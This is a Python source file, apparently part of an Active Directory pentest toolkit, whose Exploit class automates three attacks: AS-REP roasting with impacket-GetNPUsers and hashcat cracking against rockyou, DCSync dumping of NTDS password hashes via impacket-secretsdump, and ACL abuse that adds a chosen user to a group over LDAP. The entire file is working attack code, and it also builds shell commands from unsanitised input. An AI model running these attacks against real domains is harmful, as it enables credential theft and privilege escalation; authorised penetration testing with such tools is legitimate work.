import subprocess
from Util.writeHelper import *
from Enumeration.LDAPSession import LDAPSession
from ldap3.extend.microsoft.addMembersToGroups import ad_add_members_to_groups
import re

class Exploit:
    
    def __init__(self, ip='', domain='', username='', password='', name=''):
        self.name = name
        self.domain = domain
        self.ip = ip
        self.username = username
        self.password = password
        self._EXPLOIT_DATA = {
            'AS-REP Roasting': self.as_rep_roasting,
            'DCSync': self.dcsync,
            'Acls Abuse': self.acls_abuse
        }

    def run(self):
        self._EXPLOIT_DATA[self.name]()


    def as_rep_roasting(self):
        try:
            username = input("\nEnter the target username: ")
            print(green_message(f'\n[*] Requesting AS_REP message hash from {username}\n'))
            req = subprocess.run(["impacket-GetNPUsers", f'{self.domain}/{username}', '-no-pass'], capture_output=True).stdout.decode('utf-8')
            print(req)
            hash = re.search(r'\$krb5asrep\$.*', req).group(0)
            # print(green_message(f'[*] AS_REP hash: {hash.encode()}'))
            print(green_message(f'[*] Cracking the collected hash\n'))
            command = f"hashcat -m 18200 --force -a 0 '{hash}' /usr/share/wordlists/rockyou.txt > /dev/null"
            print(f'[*] Running hashcat: {command}\n')
            
            subprocess.run(command, shell=True)
            
            print(green_message(f'[*] Finished cracking the hash\n'))
            print(green_message(f'[*] Getting the password\n'))
            command = f"hashcat -m 18200 --show '{hash}'"
            print(f'[*] Running hashcat: {command}\n')
            result = subprocess.run(command, shell=True, capture_output=True).stdout.decode('utf-8')
            if result:
                print(green_message(f'[*] Cracked hash: {result}'))
            else:
                print(red_message(f'[-] Failed to crack the hash'))
        except Exception as e:
            print(red_message(f'[-] Failed to exploit AS-REP Roasting: {e}'))
            return
    def dcsync(self):
        try:
            credential = input("\nEnter the vulnerable credential (username:password): ")
            print(green_message(f'\n[*] Using secretdump for dumping NTDS secret\n'))
            command = f"impacket-secretsdump -just-dc '{credential}@{self.domain}' -outputfile dcsync_hashes"
            print(f'[*] Running secretdump: {command}\n')
            
            result = subprocess.run(command, shell=True)
            
            print(result)
        except Exception as e:
            print(red_message(f'[-] Failed to exploit DCSync: {e}'))
            return
        
    def acls_abuse(self):
        ldap_session = LDAPSession(self.ip, self.username, self.password, self.domain)
        print(green_message(f'\n[+] Adding a user to a group (required GenericAll)\n'))
        user_dn = input("\nEnter the user Distinguished Name: ")
        group_dn = input("\nEnter the group Distinguished Name for this user: ")
        try:
            ad_add_members_to_groups(ldap_session.conn, user_dn, group_dn)
        except Exception as e:
            print(red_message(f'\n[-] Failed to add the user to the group: {e}'))
            return
        print(green_message(f'\n[+] Successfully added the user to the group\n'))
        
        